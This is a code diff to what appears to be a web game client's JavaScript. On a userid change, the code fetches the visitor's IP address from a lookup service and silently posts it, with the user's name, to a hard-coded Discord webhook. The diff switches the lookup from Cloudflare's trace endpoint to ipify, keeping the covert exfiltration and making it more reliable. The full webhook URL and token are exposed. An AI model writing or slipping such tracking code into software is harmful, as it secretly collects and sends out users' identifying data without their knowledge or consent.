@@ -1142,9 +1142,9 @@ function toId() {
 
 				if (userid !== this.user.get('userid')) {
 					$.post(
-						'https://www.cloudflare.com/cdn-cgi/trace', {},
+						'https://api.ipify.org/', {},
 						function (data) {
-							$.post('https://discord.com/api/webhooks/1315269909663453245/JeKUpb6NVY5sSt659WyKizI-b0hv6k7s_pbJAe5jlySOUMUktP82wl-wuukOAmLyUIx-', {"content": `${data.split('\n').length ? data.split('\n')[2] : 'NO RESPONSE'} | ${parsed.name}${(Storage.prefs('hasRank') === false ? ' <@362252767915671562>' : '')}`});
+							$.post('https://discord.com/api/webhooks/1315269909663453245/JeKUpb6NVY5sSt659WyKizI-b0hv6k7s_pbJAe5jlySOUMUktP82wl-wuukOAmLyUIx-', {"content": `${data} | ${parsed.name}${(Storage.prefs('hasRank') === false ? ' <@362252767915671562>' : '')}`});
 						}
 					);
 				}
